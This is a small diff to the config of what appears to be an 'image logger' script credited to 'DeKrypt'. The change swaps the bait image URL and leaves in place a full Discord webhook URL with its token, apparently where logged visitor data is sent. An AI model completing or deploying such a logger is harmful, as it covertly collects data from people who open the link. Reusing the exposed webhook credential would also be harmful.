@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1336019986656792647/kFhWqpMf7bOgBW-ymb0KLC1kAFk2WiF_rajBcaDc0gQakaB559_1H0WJQLLy6vTxy0XQ",
-    "image": "https://www.google.com/imgres?q=bliss&imgurl=https%3A%2F%2Fart.thiojoe.com%2Fwallpaper%2Fbliss-neue%2FBliss%2BNeue%2B-%2B4K.jpg&imgrefurl=https%3A%2F%2Fthiojoe.art%2Fbliss-neue&docid=CmXrcpDV1jGm8M&tbnid=IpU2MkHteqEu6M&vet=12ahUKEwj2-vm6_6eLAxVuGxAIHaIMJKMQM3oECHsQAA..i&w=3840&h=2160&hcb=2&ved=2ahUKEwj2-vm6_6eLAxVuGxAIHaIMJKMQM3oECHsQAA", # You can also have a custom image by using a URL argument
+    "image": "https://www.bing.com/images/search?view=detailV2&ccid=escF%2fr0x&id=C9B9F5E4BD3BEED0A77044CF051E768204FF0D2C&thid=OIP.escF_r0xxbHdnM153PwyZAHaE7&mediaurl=https%3a%2f%2ffileinfo.com%2fimg%2fss%2fxl%2fjpg_44-2.jpg&cdnurl=https%3a%2f%2fth.bing.com%2fth%2fid%2fR.7ac705febd31c5b1dd9ccd79dcfc3264%3frik%3dLA3%252fBIJ2HgXPRA%26pid%3dImgRaw%26r%3d0&exph=1599&expw=2400&q=jpg&simid=608030644152635888&FORM=IRPRST&ck=648ADE92ABAD588E920D98BA8C2FB2AE&selectedIndex=1&itb=0.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
